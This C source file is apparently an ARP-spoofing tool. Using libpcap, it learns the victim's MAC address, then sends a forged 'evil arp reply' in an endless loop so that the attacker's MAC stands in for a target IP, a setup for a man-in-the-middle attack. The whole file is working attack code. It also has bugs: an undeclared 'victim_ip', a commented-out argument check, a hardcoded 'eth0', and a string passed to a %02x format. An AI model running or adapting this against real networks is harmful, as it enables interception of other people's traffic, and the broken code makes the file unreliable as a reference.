#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <net/if_arp.h>
#include <stdlib.h>
#include <pcap.h>
#include <errno.h>

int get_mac_by_inf(u_char mac[6], const char *dev){
	struct ifreq ifr;
	int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
	
	strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
	
	if(ioctl(fd, SIOCGIFHWADDR, &ifr) != 0){
		printf("can't get MAC Address\n");
		close(fd);
		return 0;	
	}	

	for (int i = 0; i < 6; ++i){
		mac[i] = ifr.ifr_addr.sa_data[i];
	}

	close(fd);
	return 1;
}

int get_ip_by_inf(struct in_addr* ip, const char *dev){
	struct ifreq ifr;
	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	struct sockaddr_in *sin;

	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name , dev , IFNAMSIZ-1);

	if(ioctl(fd, SIOCGIFADDR, &ifr) != 0){
		printf("can't get IP Address\n");
		close(fd);
		return 0;
	}
	 
	close(fd);
	
	sin = (struct sockaddr_in*) &ifr.ifr_addr;
	*ip = sin->sin_addr;

	return 1;
}

void
make_arp_packet(u_char **packet, int *length, int opcode, struct in_addr my_ip, struct in_addr vic_ip, u_char *my_mac, u_char *vic_mac){
	struct ether_header eth;
	struct ether_arp arp;
	
	//fill the ethernet header
	if(opcode == ARPOP_REQUEST){
		for(int i=0; i<6; i++)
			eth.ether_dhost[i] = 0xff;
	}
	else{
		
		for(int i=0; i<6; i++)
			eth.ether_dhost[i] = vic_mac[i];	
	}


	for(int i=0; i<6; i++){
		eth.ether_shost[i] = my_mac[i];
	}

	eth.ether_type = htons(ETHERTYPE_ARP);
	
	memcpy(*packet, &eth, sizeof(eth));
	(*length) += sizeof(eth);

	//fill the arp request header
	arp.arp_hrd = htons(0x0001);
	arp.arp_pro = htons(0x0800);
	arp.arp_hln = 0x06;
	arp.arp_pln = 0x04;
	arp.arp_op = htons(opcode);
	
	for(int i=0; i<6; i++){
		arp.arp_sha[i] = my_mac[i];
	}
	
	if(opcode == ARPOP_REPLY){
		for(int i=0; i<6; i++)
			arp.arp_tha[i] = vic_mac[i];
	}
	else{
			for(int i=0; i<6; i++)
				arp.arp_tha[i] = 0x00;
	}

	memcpy(arp.arp_spa, &my_ip, sizeof(my_ip));
	memcpy(arp.arp_tpa, &vic_ip, sizeof(vic_ip));
	
	memcpy((*packet)+(*length), &arp, sizeof(arp));
	(*length) += sizeof(arp);

}

int main(int argc, char *argv[]){
	pcap_t *handle;			
	char errbuf[PCAP_ERRBUF_SIZE];
	bpf_u_int32 net;
	bpf_u_int32 mask;
	struct bpf_program fp;
	char filter_exp[50] = "arp src host ";
	struct pcap_pkthdr *header;	
	struct in_addr my_ip_addr;
	struct in_addr vic_ip_addr;
	struct in_addr target_ip_addr;
	char ip_addr[16];


	u_char my_mac[6];
	u_char vic_mac[6];

	u_char *packet;
	int length = 0;
	const u_char *recv_packet;

	int flag = 0;

	// if(argc != 4){
	// 	printf("./send_arp interface_name victim_ip target_ip!!\n");
	// 	return -1;	
	// }
	
	// strncat(filter_exp, argv[2], strlen(argv[2]));


	handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);

	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", argv[1], errbuf);
		return -2;
	}	

	if(pcap_lookupnet("eth0", &net, &mask, errbuf) == -1){
		fprintf(stderr, "Couldn't get net info %s: %s\n", argv[1], errbuf);
		return -3;
	}	
	
	if(pcap_compile(handle, &fp, filter_exp, 0, net) == -1){
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return -4;
	}

	// if(pcap_setfilter(handle, &fp) == -1){
	// 	fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
	// 	return -5;
	// }

	packet = (u_char *)malloc(sizeof(u_char) * 100);
	recv_packet = (u_char *)malloc(sizeof(u_char) * 1500);

	get_mac_by_inf(my_mac, argv[1]);
	get_ip_by_inf(&my_ip_addr, argv[1]);

	inet_pton(AF_INET, victim_ip, &vic_ip_addr);
	inet_pton(AF_INET, argv[3], &target_ip_addr);
	
	inet_ntop(AF_INET, &my_ip_addr, ip_addr, sizeof(ip_addr));	

	if(((bpf_u_int32)vic_ip_addr.s_addr & mask) != net){
		fprintf(stderr, "%s, %s is different network\n", ip_addr, argv[2]);
		return -6;
	}
	
	if(((bpf_u_int32)target_ip_addr.s_addr & mask) != net){
		fprintf(stderr, "%s, %s is different network\n", ip_addr, argv[3]);
		return -6;
	}

	if(((bpf_u_int32)vic_ip_addr.s_addr & mask) != ((bpf_u_int32)target_ip_addr.s_addr & mask)){
		fprintf(stderr, "%02x, %02x is different network\n", argv[2], argv[3]);
		return -6;
	}
	
	printf("send arp request to get victim[%s] macaddress...\n", argv[2]);

	make_arp_packet(&packet, &length, ARPOP_REQUEST, my_ip_addr, vic_ip_addr, my_mac, NULL);

	if(pcap_sendpacket(handle, packet, length) != 0){
		fprintf(stderr, "\nError sending the packet : %s\n", pcap_geterr(handle));
		return -1;	
	}
	
	printf("waitting for recive victim[%s] arp reply packet...\n", argv[2]);
	//capture arp reply packet
	while(1){
		flag = pcap_next_ex(handle, &header, &recv_packet);
		if(flag == 1)
			break;

		else if(flag == -1){
			fprintf(stderr, "network errer!! : %s\n", pcap_geterr(handle));
			return -7;
		}
		else
			fprintf(stderr, "timeout expired\n");
	};

	printf("victim[%s] macaddress : ", argv[2]);

	for(int i=6; i<12; i++){
		vic_mac[i-6] = recv_packet[i];
		printf("%02x", vic_mac[i-6]);
		if(i != 11)
			printf(":");
	}

	memset(packet, 0, length);
	
	length = 0;
	
	//build evil arp reply packet	
	make_arp_packet(&packet, &length, ARPOP_REPLY, target_ip_addr, vic_ip_addr, my_mac, vic_mac);

	//send evil arp reply packet

	printf("\nsend evil arp reply to victim[%s] sfooping my ip[%s] to target ip[%s]\n", argv[2], ip_addr, argv[3]);

	while(1){
		if(pcap_sendpacket(handle, packet, length) != 0)
			fprintf(stderr, "\nError sending the packet : %s\n", pcap_geterr(handle));
	
		sleep(500);
	}	
		
	return 0;
}